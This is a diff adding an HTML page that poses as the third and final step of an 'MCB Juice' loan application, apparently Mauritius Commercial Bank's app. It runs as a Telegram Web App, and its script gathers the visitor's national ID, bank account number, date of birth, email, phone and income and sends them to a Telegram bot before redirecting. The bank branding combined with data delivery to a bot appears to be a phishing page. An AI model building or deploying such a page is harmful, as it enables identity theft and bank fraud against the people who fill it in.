@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="mfe">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MCB Juice - Resime Demann</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --mcb-red: #d32f2f;
+            --mcb-hover: #b71c1c;
+            --bg-color: #fce4ec;
+            --card-bg: #ffffff;
+            --text-main: #000000;
+            --text-muted: #888888;
+            --input-border: #e2e8f0;
+            --btn-gray: #e8e8e8;
+            --btn-gray-text: #555555;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .app-header {
+            width: 100%;
+            background-color: var(--mcb-red);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .back-btn-top {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 20px;
+            font-weight: 800;
+            color: #ffffff;
+        }
+
+        .header-title .mcb-bold { color: #ffffff; margin-right: 4px; }
+        .header-title .mcb-sub { color: #ffccbc; font-weight: 500; }
+
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 26px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .subtext {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: space-center;
+            gap: 12px;
+            margin: 0 auto 32px;
+            width: 80%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background-color: #e2e8f0;
+            border-radius: 2px;
+        }
+
+        .step-bar.active {
+            background-color: var(--mcb-red);
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 15px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 10px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #ffffff;
+            color: #333333;
+            outline: none;
+            width: 100%;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+        }
+
+        .form-control:focus {
+            border-color: var(--mcb-red);
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23555555' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            background-size: 14px;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        .summary-card {
+            background-color: #fafafa;
+            border-left: 4px solid var(--mcb-red);
+            padding: 18px 16px;
+            border-radius: 10px;
+            margin: 10px 0 24px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+        }
+
+        .summary-card h3 {
+            margin: 0 0 14px 0;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-main);
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #eeeeee;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .summary-label {
+            color: #666666;
+            font-size: 13.5px;
+            font-weight: 500;
+        }
+
+        .summary-value {
+            font-weight: 700;
+            font-size: 13.5px;
+            color: #111111;
+            text-align: right;
+        }
+
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .btn-prev {
+            background-color: var(--btn-gray);
+            color: var(--btn-gray-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next {
+            background-color: var(--mcb-red);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: var(--mcb-hover);
+        }
+
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #666666;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← Retour</a>
+    <div class="header-title">
+        <span class="mcb-bold">MCB</span><span class="mcb-sub">JUICE</span>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Demann Prè</h1>
+    <div class="subtext">etap 3 lor 3</div>
+
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+    </div>
+
+    <form id="step3Form" onsubmit="submitForm(event)">
+        <div class="form-group">
+            <label for="jobStatus">Sitiasion Travay</label>
+            <select id="jobStatus" class="form-control" required>
+                <option value="Anplwaye" selected>Anplwaye (Employee)</option>
+                <option value="Business Owner">Proprieter Biznes</option>
+                <option value="Zetidian">Zetidian (Student)</option>
+                <option value="San Travay">San Travay</option>
+                <option value="Retrete">Retrete</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="income">Revenu Minsiel Mwayin (MUR)</label>
+            <input type="number" id="income" class="form-control" placeholder="Egil: 35000" required>
+        </div>
+
+        <div class="summary-card">
+            <h3>Resime Demann</h3>
+
+            <div class="summary-row">
+                <span class="summary-label">Montan Prè:</span>
+                <span class="summary-value" id="sumAmount">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Dire:</span>
+                <span class="summary-value" id="sumDuration">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Rezon:</span>
+                <span class="summary-value" id="sumPurpose">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">National ID:</span>
+                <span class="summary-value" id="sumNationalId">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">MCB Account:</span>
+                <span class="summary-value" id="sumAccount">--</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Telefonn:</span>
+                <span class="summary-value" id="sumPhone">--</span>
+            </div>
+        </div>
+
+        <div class="btn-container">
+            <button type="button" class="btn-prev" onclick="goBack()">Tounen</button>
+            <button type="submit" class="btn-next"> SOUVIET DEMANN</button>
+        </div>
+    </form>
+</div>
+
+<div class="footer-banner">
+    © 2026 MCB Mauritius
+</div>
+
+<script>
+window.onload = () => {
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();   
+        tg.expand();
+    }
+
+    const amount = localStorage.getItem('appliedAmount') || localStorage.getItem('amount');
+    const term = localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration');
+    const purpose = localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose');
+    const nationalId = localStorage.getItem('nationalId') || "";
+    const accountNumber = localStorage.getItem('accountNumber') || "";
+    const phone = localStorage.getItem('phone') || "";
+
+    if (amount) {
+        const numAmount = Number(amount.replace(/\D/g, ''));
+        document.getElementById('sumAmount').innerText = numAmount 
+            ? `${numAmount.toLocaleString('en-US')} MUR` 
+            : `${amount} MUR`;
+    } else {
+        document.getElementById('sumAmount').innerText = "--";
+    }
+
+    document.getElementById('sumDuration').innerText = term ? term : "--";
+    document.getElementById('sumPurpose').innerText = purpose ? purpose : "--";
+    document.getElementById('sumNationalId').innerText = nationalId || "--";
+    document.getElementById('sumAccount').innerText = accountNumber || "--";
+    document.getElementById('sumPhone').innerText = phone ? `+230 ${phone}` : "--";
+};
+
+function submitForm(event) {
+    event.preventDefault();
+    const tg = window.Telegram?.WebApp;
+    const incomeVal = document.getElementById('income').value.trim();
+
+    if (!incomeVal) {
+        alert("Silvouplé rantre ou revenu minsiel.");
+        return;
+    }
+
+    const data = {
+        amount: localStorage.getItem('appliedAmount') || localStorage.getItem('amount'),
+        duration: localStorage.getItem('appliedTerm') || localStorage.getItem('loanDuration'),
+        purpose: localStorage.getItem('appliedPurpose') || localStorage.getItem('loanPurpose'),
+        nationalId: localStorage.getItem('nationalId'),
+        accountNumber: localStorage.getItem('accountNumber'),
+        dob: localStorage.getItem('dob'),
+        email: localStorage.getItem('email'),
+        phone: localStorage.getItem('phone'),
+        jobStatus: document.getElementById('jobStatus').value,
+        income: incomeVal,
+        currency: "MUR"
+    };
+
+    localStorage.setItem('jobStatus', data.jobStatus);
+    localStorage.setItem('income', incomeVal);
+
+    if (tg && tg.sendData) {
+        tg.sendData(JSON.stringify(data));
+        setTimeout(() => {
+            window.location.href = "/page5";
+        }, 300);
+    } else {
+        console.log("Submitted payload:", data);
+        window.location.href = "/page5";
+    }
+}
+
+function goBack() {
+    window.location.href = "/page3";
+}
+</script>
+
+</body>
+</html>
